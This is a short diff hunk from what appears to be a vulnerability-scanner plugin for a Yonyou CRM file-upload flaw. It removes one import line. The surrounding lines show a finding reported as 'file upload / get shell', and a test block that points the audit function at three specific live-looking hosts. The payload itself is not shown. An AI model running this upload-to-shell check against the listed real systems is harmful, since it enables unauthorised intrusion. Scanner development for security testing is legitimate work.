@@ -50,7 +50,7 @@ upload
             security_hole(arg+payload+" ---> "+arg+"tmpfile/"+reRes[0]+" : file upload / get shell")
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('yongyou_crm', 'http://111.207.244.5:8888/')[1])
     audit(assign('yongyou_crm', 'http://prm.yonyou.com/')[1])
     audit(assign('yongyou_crm', 'http://180.169.30.13:2046/')[1])
